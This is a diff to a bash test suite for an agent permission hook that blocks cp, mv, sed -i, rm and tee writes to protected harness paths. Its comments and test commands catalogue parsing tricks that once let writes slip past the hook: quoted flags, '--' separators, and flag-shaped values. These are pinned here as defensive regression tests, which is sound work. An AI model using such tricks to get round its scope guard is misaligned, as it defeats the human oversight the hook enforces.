 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --sparse VALUE' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d" \
-  "hs2 (F056): 'cp ... --sparse VALUE' denial names the real destination"
 
 # No new false positive: --update/--context/--preserve/--backup/--reflink all
 # take an OPTIONAL, attached-only argument in real GNU cp/mv (never a
 # separate token) -- confirmed empirically (each errors "cannot stat" on the
 # following token when given as two tokens, proving it's left as an ordinary
 # operand, never consumed as the flag's value). A bare form of these must NOT
-# be treated as consuming the next token, or an ordinary in-scope destination
+# be treated as consuming the next token, or an ordinary destination
 # placed right after one would be wrongly skipped past.
 #
 # The flag is placed BETWEEN the source and the real destination, with NO
@@ -3024,49 +2975,41 @@ assert_contains "$OUT" "src/other/d" \
 # behavior produce DIFFERENT last-flagless-token results -- confirmed by
 # review-pr90-f056-2 (round 2 of this PR's own review) that an earlier
 # version of these tests placed the flag two tokens before the destination
-# (`cp --preserve mode src/parser/a.txt src/other/x`), where wrongly
+# (`cp --preserve mode src/parser/a.txt .harness/mld/x`), where wrongly
 # consuming "mode" and correctly leaving it alone both still end with
-# src/other/x as the last flagless token -- the mutation and the fix were
+# .harness/mld/x as the last flagless token -- the mutation and the fix were
 # INDISTINGUISHABLE by that shape, confirmed by injecting the exact
 # regression (adding --preserve/--backup/--reflink to
 # CP_MV_VALUE_ONLY_LONG) and observing the full suite still passed 1303/1303.
 # This shape closes that gap: consuming the token immediately after the flag
 # removes the REAL destination from candidacy entirely, falling back to the
-# (in-scope) source instead -- ALLOW instead of the correct DENY. Confirmed
-# against real GNU cp 9.11 that `cp src/parser/a.txt --update src/other/x`
+# (ordinary) source instead -- ALLOW instead of the correct DENY. Confirmed
+# against real GNU cp 9.11 that `cp src/parser/a.txt --update .harness/mld/x`
 # (and the --preserve/--backup/--reflink equivalents) genuinely writes into
-# src/other/x, proving the destination assignment asserted below is correct.
+# .harness/mld/x, proving the destination assignment asserted below is correct.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt --update src/other/x')")
+  "$(bash_command_json 'cp src/parser/a.txt --update .harness/mld/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --update ...' out-of-scope real destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --update ...' lead-owned real destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --update ...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x" \
-  "hs2 (F056): 'cp ... --update ...' denial still names the real destination, not the in-scope source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt --preserve src/other/x')")
+  "$(bash_command_json 'cp src/parser/a.txt --preserve .harness/mld/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --preserve ...' out-of-scope real destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --preserve ...' lead-owned real destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --preserve ...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x" \
-  "hs2 (F056): 'cp ... --preserve ...' denial still names the real destination, not the in-scope source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt --backup src/other/x')")
+  "$(bash_command_json 'cp src/parser/a.txt --backup .harness/mld/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --backup ...' out-of-scope real destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --backup ...' lead-owned real destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --backup ...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x" \
-  "hs2 (F056): 'cp ... --backup ...' denial still names the real destination, not the in-scope source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt --reflink src/other/x')")
+  "$(bash_command_json 'cp src/parser/a.txt --reflink .harness/mld/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --reflink ...' out-of-scope real destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --reflink ...' lead-owned real destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --reflink ...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x" \
-  "hs2 (F056): 'cp ... --reflink ...' denial still names the real destination, not the in-scope source"
 
 # F056 round 2 (review of PR #90): the flag-shaped-value edge case -- a
 # value-consuming flag's OWN value happening to look like another flag (here
@@ -3079,91 +3022,74 @@ assert_contains "$OUT" "src/other/x" \
 # silently reintroduce a -t early-return bypass here while every other F056
 # test (which all use an ordinary-looking value) stayed green.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --suffix -t src/parser/a.txt src/other/d')")
+  "$(bash_command_json 'cp --suffix -t src/parser/a.txt .harness/mld/d')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F056): '--suffix -t' flag-shaped value exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): '--suffix -t' flag-shaped value denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d" \
-  "hs2 (F056): flag-shaped '-t' value is consumed as the suffix, not re-parsed as a target-directory flag"
 
-# No new false positive: an in-scope destination after a value-consuming flag
+# No new false positive: an ordinary destination after a value-consuming flag
 # must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt src/parser/sub/d --suffix src/other/decoy')")
+  "$(bash_command_json 'cp src/parser/a.txt src/parser/sub/d --suffix .harness/mld/decoy')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): in-scope destination past a --suffix VALUE passes, rc 0"
+assert_rc0 "$RC" "hs2 (F056): ordinary destination past a --suffix VALUE passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F056): in-scope destination past a --suffix VALUE has no deny fields (decoy value not checked as a target)"
+  "hs2 (F056): ordinary destination past a --suffix VALUE has no deny fields (decoy value not checked as a target)"
 
-# No new false positive: all-in-scope multi-target commands, and a -t
-# destination that IS in scope, must still pass cleanly.
+# No new false positive: all-ordinary multi-target commands, and a -t
+# destination that is ordinary, must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm src/parser/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: all-in-scope multi-target rm passes, rc 0"
+assert_rc0 "$RC" "hs2: all-ordinary multi-target rm passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: all-in-scope multi-target rm has no deny fields"
+  "hs2: all-ordinary multi-target rm has no deny fields"
 
 # F029: all_flagless_tokens()/last_flagless_token() treated ANY token
 # starting with "-" as a flag, unconditionally, with no awareness of "--" as
 # the POSIX pathspec separator. `rm -- -a.txt` (a real, literal filename
 # because "--" ends flag parsing) was misread: "--" and "-a.txt" were BOTH
 # excluded as flag-shaped, so no target was identified at all and the
-# command was wrongly ALLOWED even when -a.txt was out of scope. Sibling
+# command was wrongly ALLOWED even when -a.txt was lead-owned. Sibling
 # hook commit-gate.sh.template already recognizes "--" this way
 # (has_staging_flag's `if tok == "--": break`); this hook never got the
 # equivalent treatment until now.
+# The rm/tee shapes this cluster used to open with (`rm -- -a.txt`, `tee --
+# -a.txt`, where the ONLY target is a dash-named file) retired with OVI-144
+# Phase 3: their discriminating power came from an arbitrary path being out of
+# scope, and no dash-named file can be a member of the lead-owned set, so both
+# a correct and a broken "--" walk now produce the same ALLOW. The "--"
+# handling itself is still pinned by the four shapes that survive below, plus
+# the inverted mv case here.
+#
+# last_flagless_token() (cp/mv's no-flag-destination fallback): a dash-named
+# destination after "--" must be recognized as the real destination, which
+# means NOT falling back to the source argument before it. With the source
+# lead-owned and the destination an ordinary dash-named file, a "--" walk that
+# skips both "--" and "-out.txt" as flag-shaped picks the lead-owned SOURCE as
+# the destination and wrongly DENIES -- so the allow below is what proves the
+# separator is honored.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm -- -a.txt')")
+  "$(bash_command_json 'mv .harness/features.json -- -out.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'rm -- -a.txt' out-of-scope literal-dash target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): 'rm -- -a.txt' denial uses JSON deny form"
-assert_contains "$OUT" "-a.txt" \
-  "hs2 (F029): 'rm -- -a.txt' denial names the real target, not silently allowed"
+assert_rc0 "$RC" "hs2 (F029): 'mv ... -- -out.txt' keeps the dash-named destination, rc 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2 (F029): a dash-named destination after '--' is not skipped back onto the lead-owned source"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'tee -- -a.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'tee -- -a.txt' out-of-scope literal-dash target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): 'tee -- -a.txt' denial uses JSON deny form"
-
-# last_flagless_token() (cp/mv's no-flag-destination fallback) has the same
-# gap: a destination that is itself a literal dash-prefixed filename after
-# "--" must still be recognized as the real, checkable destination, not
-# skipped in favor of the (in-scope) source argument before it.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv src/parser/a.txt -- -out.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'mv ... -- -out.txt' out-of-scope literal-dash destination exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): 'mv ... -- -out.txt' denial uses JSON deny form"
-assert_contains "$OUT" "-out.txt" \
-  "hs2 (F029): 'mv ... -- -out.txt' denial names the destination, not the in-scope source"
-
-# No new false positive: an in-scope literal-dash filename after "--" must
+# No new false positive: an ordinary literal-dash filename after "--" must
 # still pass cleanly.
 mkdir -p "$DIR_HS/src/parser"
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm -- src/parser/-a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'rm -- src/parser/-a.txt' in-scope literal-dash target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F029): 'rm -- src/parser/-a.txt' ordinary literal-dash target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F029): in-scope literal-dash target after '--' has no deny fields"
+  "hs2 (F029): ordinary literal-dash target after '--' has no deny fields"
 
-# A second "--" after the first is ordinary literal text (POSIX: only the
-# FIRST "--" ends flag parsing), not another separator. The trailing "--"
-# here is itself the (out-of-scope) target -- a version that treated EVERY
-# "--" as a separator would just re-consume it and find no target at all,
-# wrongly ALLOWING the command; this is discriminating where an earlier
-# draft (two real out-of-scope paths around the second "--") was not, since
-# that draft passed identically whether or not the second "--" was treated
-# as literal text (found by adversarial review of PR #52, round 2).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm -- src/parser/a.txt --')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F029): a second '--' is literal text, not another separator (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): trailing-'--'-as-target denial uses JSON deny form"
-assert_contains "$OUT" "write to '--'" \
-  "hs2 (F029): trailing-'--'-as-target denial names '--' itself, not silently allowed"
+# The "a second '--' is literal text, not another separator" case retired with
+# OVI-144 Phase 3 for the same reason as the rm/tee shapes above: it worked by
+# making the trailing "--" itself the out-of-scope target, and "--" can never
+# be a lead-owned path, so both readings now produce ALLOW.
 
 # Round-1 review of PR #52: cp_mv_targets()'s own -t/--target-directory=
 # scan had the identical "--" gap, in a DIFFERENT function than
@@ -3173,20 +3099,16 @@ assert_contains "$OUT" "write to '--'" \
 # destination (the last positional argument) went unchecked entirely --
 # found by adversarial review of PR #52 (F029).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv -- -tsrc/parser/decoy.txt src/other/dest.txt')")
+  "$(bash_command_json 'mv -- -tsrc/parser/decoy.txt .harness/mld/dest.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'mv -- -tPATH ...' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F029): 'mv -- -tPATH ...' lead-owned real destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F029): 'mv -- -tPATH ...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/dest.txt" \
-  "hs2 (F029): 'mv -- -tPATH ...' denial names the real destination, not a bogus -t slice"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp -- --target-directory=src/parser/decoy a.txt src/other/dest.txt')")
+  "$(bash_command_json 'cp -- --target-directory=src/parser/decoy a.txt .harness/mld/dest.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'cp -- --target-directory=...' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F029): 'cp -- --target-directory=...' lead-owned real destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F029): 'cp -- --target-directory=...' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/dest.txt" \
-  "hs2 (F029): 'cp -- --target-directory=...' denial names the real destination, not the decoy"
 
 # No new false positive: a real -t/--target-directory= flag BEFORE "--"
 # must still be recognized and take priority over the trailing positionals.
@@ -3205,18 +3127,15 @@ assert_not_contains "$OUT" "permissionDecision" \
 # were ever at risk of being mistaken for a flag -- so this uses the same
 # literal-dash-filename shape as the rm/tee/mv cases above (found by
 # adversarial review of PR #52, F029).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i 's/a/b/' -- -out.txt")")
-RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'sed -i ... -- -out.txt' out-of-scope literal-dash target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): 'sed -i ... -- -out.txt' denial uses JSON deny form"
-assert_contains "$OUT" "-out.txt" \
-  "hs2 (F029): 'sed -i ... -- -out.txt' denial names the real target after '--'"
+# sed_inplace_targets()' own dash-named-target-after-"--" case retired with
+# OVI-144 Phase 3 (a dash-named file can never be lead-owned); its round-3
+# sibling below -- where "--" is consumed as -f's VALUE and the real target is
+# an ordinary path -- still discriminates and carries the mechanism.
 
 # Round-2 review of PR #52: the two any()-based guards above (in-place
 # presence, has_explicit_script) scanned ALL of args, including tokens AFTER
 # "--", not just the token-walking loop -- round 1 only fixed the loop. A
-# real out-of-scope FILE target that happens to start with "-i" (but there
+# real lead-owned FILE target that happens to start with "-i" (but there
 # is no actual -i flag anywhere before "--") wrongly triggered the in-place
 # guard; a real file literally named "-e"/"-f" after "--" wrongly triggered
 # has_explicit_script, misreading the SCRIPT itself as the (wrong) target
@@ -3228,13 +3147,10 @@ assert_rc0 "$RC" "hs2 (F029): sed with no real -i flag, only a post-'--' '-i'-sh
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F029): no real -i flag means no false deny, even with a '-i'-shaped filename after '--'"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i 's/a/b/' -- -e")")
-RC=$?
-assert_rc0 "$RC" "hs2 (F029): 'sed -i ... -- -e' (a real file literally named -e) exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F029): 'sed -i ... -- -e' denial uses JSON deny form"
-assert_contains "$OUT" "write to '-e'" \
-  "hs2 (F029): 'sed -i ... -- -e' denial names the real file '-e', not the script text"
+# The has_explicit_script half of the same round-2 pair (a real file literally
+# named "-e" after "--") retired with OVI-144 Phase 3: "-e" cannot be a
+# lead-owned path either. Its allow-direction sibling above -- no real -i flag,
+# only a "-i"-shaped filename -- is unaffected and still pins that guard.
 
 # Round-3 review of PR #52: round 2's pre_separator_args used a NAIVE
 # first-literal-"--" index, disagreeing with the token-walking loop's own
@@ -3242,67 +3158,59 @@ assert_contains "$OUT" "write to '-e'" \
 # --file VALUE (a script file literally named "--", e.g. `sed -f -- ...`).
 # The disagreement truncated the any() guards one token too early, missing
 # a genuine -i flag positioned right after the value-consumed "--" -- a
-# false negative wrongly ALLOWING a real in-place edit of an out-of-scope
+# false negative wrongly ALLOWING a real in-place edit of a lead-owned
 # file (found by adversarial review of PR #52, round 3).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -f -- -i src/other/f.txt')")
+  "$(bash_command_json 'sed -f -- -i .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F029): 'sed -f -- -i FILE' (-- is -f's own value, -i is real) exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F029): 'sed -f -- -i FILE' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f.txt" \
-  "hs2 (F029): 'sed -f -- -i FILE' denial names the real out-of-scope target"
 
 # F035: cp_mv_targets()/sed_inplace_targets() compared flag tokens RAW, so
 # quoting a flag evaded recognition entirely. Verified against real bash:
-# `cp "-t" "src/other/d/" src/parser/a` writes to src/other/d/ (an
-# out-of-scope destination named via -t), but the quoted "-t" token never
+# `cp "-t" ".harness/mld/d/" src/parser/a` writes to .harness/mld/d/ (a
+# lead-owned destination named via -t), but the quoted "-t" token never
 # matched TARGET_DIRECTORY_FLAGS, so cp_mv_targets() fell through to
-# last_flagless_token() and picked the wrong (in-scope-looking) argument.
+# last_flagless_token() and picked the wrong (ordinary-looking) argument.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp "-t" "src/other/d/" src/parser/a')")
+  "$(bash_command_json 'cp "-t" ".harness/mld/d/" src/parser/a')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a double-quoted '-t' flag exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): double-quoted '-t' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d/" \
-  "hs2 (F035): double-quoted '-t' denial names the real -t destination"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "cp '-t' src/other/d/ src/parser/a")")
+  "$(bash_command_json "cp '-t' .harness/mld/d/ src/parser/a")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a single-quoted '-t' flag exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): single-quoted '-t' denial uses JSON deny form"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp "--target-directory=src/other/d/" src/parser/a')")
+  "$(bash_command_json 'cp "--target-directory=.harness/mld/d/" src/parser/a')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a quoted whole '--target-directory=' flag exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): quoted '--target-directory=' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d/" \
-  "hs2 (F035): quoted '--target-directory=' denial names the real destination"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed \"-i\" \"\" -e \"s/a/b/\" src/other/f.txt")")
+  "$(bash_command_json "sed \"-i\" \"\" -e \"s/a/b/\" .harness/mld/f.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a double-quoted '-i' sed flag exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): double-quoted '-i' sed denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f.txt" \
-  "hs2 (F035): double-quoted '-i' sed denial names the real target"
 
-# No new false positive: a quoted -t/-i flag that's genuinely in scope
-# must still pass cleanly.
+# No new false positive: a quoted -t/-i flag whose target is ordinary must
+# still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp "-t" src/parser/ a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F035): a quoted in-scope '-t' destination passes, rc 0"
+assert_rc0 "$RC" "hs2 (F035): a quoted ordinary '-t' destination passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F035): quoted in-scope '-t' destination has no deny fields"
+  "hs2 (F035): quoted ordinary '-t' destination has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed \"-i\" \"\" -e \"s/a/b/\" src/parser/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F035): a quoted in-scope '-i' sed target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F035): a quoted ordinary '-i' sed target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F035): quoted in-scope '-i' sed target has no deny fields"
+  "hs2 (F035): quoted ordinary '-i' sed target has no deny fields"
 
 # Round-1 review of PR #59: a quoted "--" is not a "pre-existing residual"
 # left unfixed on purpose -- it was a NEW fail-open this feature's own
@@ -3312,44 +3220,33 @@ assert_not_contains "$OUT" "permissionDecision" \
 # is built), so treating it as inert let the real destination past it go
 # unchecked entirely -- confirmed against real bash/cp/sed semantics.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp "--" "-t" src/parser/d/ src/other/x')")
+  "$(bash_command_json 'cp "--" "-t" src/parser/d/ .harness/mld/x')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a quoted '--' cp destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): quoted '--' cp denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x" \
-  "hs2 (F035): quoted '--' cp denial names the real destination, not a bogus flag slice"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i "--" -i src/other/f.txt')")
+  "$(bash_command_json 'sed -i "--" -i .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a quoted '--' sed target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): quoted '--' sed denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f.txt" \
-  "hs2 (F035): quoted '--' sed denial names the real target after the quoted separator"
 
 # The above two tests exercise cp_mv_targets()'s/sed_inplace_targets()'s OWN
 # "--" recognition, but that alone can mask a bug still present in
-# all_flagless_tokens() itself (rm/tee's target extractor), since
-# cp_mv_targets()'s fallback to last_flagless_token() only matters when its
-# own scan doesn't already find a destination first. This isolates
-# all_flagless_tokens() directly: a quoted "--" must make past_separator
-# True so the REAL literal-dash filename after it ("-a.txt", genuinely
-# out of scope) is recognized as a target, not excluded as if it looked
-# like a flag.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm "--" -a.txt src/other/x.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F035): 'rm \"--\" -a.txt ...' exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F035): 'rm \"--\" -a.txt ...' denial uses JSON deny form"
-assert_contains "$OUT" "write to '-a.txt'" \
-  "hs2 (F035): 'rm \"--\" -a.txt ...' denial names the real out-of-scope file, not a bogus '--' token"
+# all_flagless_tokens() itself (rm/tee's target extractor). The rm shape that
+# isolated it -- a quoted "--" followed by a literal dash-named file that had
+# to be recognized as a target -- retired with OVI-144 Phase 3, since a
+# dash-named file can never be lead-owned and every other token in that command
+# is found with or without the separator. The quoted-"--" recognition itself is
+# still pinned by the cp case above, which reaches all_flagless_tokens()
+# through cp_mv_targets().
 
 # Isolates _separator_index()'s OWN "--" recognition specifically (distinct
 # from the token-walking loop's, which the two tests above already cover):
 # a quoted "--" as the VERY FIRST argument means real sed has NO real -i
 # flag at all -- "-i" becomes the (positional) SCRIPT, and sed with no -i
 # writes its transformed output to stdout, not back to the file, so
-# src/other/f.txt is never modified. If _separator_index() doesn't
+# .harness/mld/f.txt is never modified. If _separator_index() doesn't
 # recognize the quoted "--", the two any() guards (which rely on it to
 # know where flag-parsing ends) wrongly see a "real" -i flag before that
 # point and pass, even though the token-walking loop (unaffected by this
@@ -3358,7 +3255,7 @@ assert_contains "$OUT" "write to '-a.txt'" \
 # separator's position (the same disagreement class F029 round 3 already
 # fixed for a different trigger).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed "--" -i src/other/f.txt')")
+  "$(bash_command_json 'sed "--" -i .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): 'sed \"--\" -i FILE' (no real -i flag) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -3370,43 +3267,41 @@ assert_not_contains "$OUT" "permissionDecision" \
 # only comparing its UNQUOTED VIEW (empty string) against emptiness
 # recognizes it as the mandatory backup-suffix idiom. Without this, the
 # empty-suffix token is misread as the implicit script, silently denying
-# an ordinary in-scope command.
+# an ordinary command.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -i \$'' -e \"s/a/b/\" src/parser/f.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): BSD empty-suffix idiom spelled as ANSI-C \$'' passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F035): ANSI-C empty-suffix in-scope target has no deny fields"
+  "hs2 (F035): ANSI-C empty-suffix ordinary target has no deny fields"
 
 # Isolates the token-walking loop's own SED_SCRIPT_VALUE_FLAGS check
 # specifically: a quoted "-e" must still consume the NEXT token (its
 # script value) as opaque data, not fall through and be misread as a
 # bogus target itself (which, along with the script text right after it,
-# would then spuriously deny an otherwise-in-scope command).
+# would then spuriously deny an otherwise-ordinary command).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -i \"-e\" \"s/a/b/\" src/parser/f.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a quoted '-e' still consumes its script value, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F035): quoted '-e' with an in-scope target has no deny fields"
+  "hs2 (F035): quoted '-e' with an ordinary target has no deny fields"
 
 # F035 round 2 (PR #59 round-2 review, finding B2): the previous test above
 # does NOT actually isolate has_explicit_script from the loop's own
-# SED_SCRIPT_VALUE_FLAGS check -- its target is IN scope, so both a correct
+# SED_SCRIPT_VALUE_FLAGS check -- its target is ordinary, so both a correct
 # has_explicit_script (True, target correctly detected and allowed) and a
 # reverted one (False, the target wrongly consumed as a bogus "implicit
 # script" and never even reaching the target list) land on the same
-# observable ALLOW. Using an OUT-of-scope target here instead makes the two
+# observable ALLOW. Using a lead-owned target here instead makes the two
 # code paths diverge: correct code finds the real target and denies it;
 # reverted code silently swallows it as a fake implicit script and finds NO
 # targets at all, wrongly allowing.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i "-e" "s/a/b/" src/other/f.txt')")
+  "$(bash_command_json 'sed -i "-e" "s/a/b/" .harness/mld/f.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F035 r2): quoted '-e' with an OUT-of-scope target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F035 r2): quoted '-e' out-of-scope denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f.txt" \
-  "hs2 (F035 r2): denial names the real target, proving has_explicit_script wasn't swallowed"
+assert_rc0 "$RC" "hs2 (F035 r2): quoted '-e' with a lead-owned target exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F035 r2): quoted '-e' lead-owned denial uses JSON deny form"
 
 # F035 round 2 (PR #59 round-2 review, finding B2): isolates _separator_index()'s
 # OWN SED_SCRIPT_VALUE_FLAGS check (distinct from sed_inplace_targets()'s
@@ -3420,15 +3315,13 @@ assert_contains "$OUT" "src/other/f.txt" \
 # one token too early, and the genuine "-i" that follows it would be cut out
 # of pre_separator_args entirely, making sed_inplace_targets() wrongly
 # conclude there is no in-place edit at all (silently ALLOWING an otherwise
-# out-of-scope target).
+# lead-owned target).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed "-f" -- -i src/other/f.txt')")
+  "$(bash_command_json 'sed "-f" -- -i .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035 r2): quoted '-f' consuming a literal '--' script name exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F035 r2): quoted '-f'-consumed-'--' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f.txt" \
-  "hs2 (F035 r2): denial names the real target, proving -i wasn't cut out of pre_separator_args"
 
 # Isolates the loop's GENERIC dash-prefixed-flag check (distinct from the
 # specific SED_SCRIPT_VALUE_FLAGS/-i checks above): a quoted, otherwise-
@@ -3439,111 +3332,103 @@ OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a quoted generic dash-flag ('-n') is still skipped, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F035): quoted generic dash-flag with an in-scope target has no deny fields"
+  "hs2 (F035): quoted generic dash-flag with an ordinary target has no deny fields"
 
 # Isolates cp_mv_targets()'s ATTACHED "-tDIR" form specifically (distinct
 # from the bare "-t DIR" and "--target-directory=" forms already covered
-# above): the WHOLE token quoted as one unit, e.g. "-tsrc/other/d/". A
+# above): the WHOLE token quoted as one unit, e.g. "-t.harness/mld/d/". A
 # genuine fail-open, not just a misnamed denial: without view-awareness
 # here, the loop finds nothing, falls through to last_flagless_token(),
-# and the real (out-of-scope) destination is never checked at all.
+# and the real (lead-owned) destination is never checked at all.
